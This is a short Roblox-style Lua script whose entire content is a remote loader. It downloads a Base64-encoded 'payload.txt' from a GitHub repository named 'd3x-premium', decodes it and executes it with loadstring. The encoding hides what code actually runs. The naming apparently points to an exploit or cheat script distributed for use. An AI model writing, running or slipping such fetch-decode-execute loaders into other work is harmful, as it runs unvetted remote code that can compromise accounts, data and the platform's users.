local HttpService = game:GetService("HttpService")

local URL = "https://raw.githubusercontent.com/xwwuhq/d3x-premium/main/payload.txt"

local raw = game:HttpGet(URL)
local decoded = HttpService:Base64Decode(raw)

loadstring(decoded)()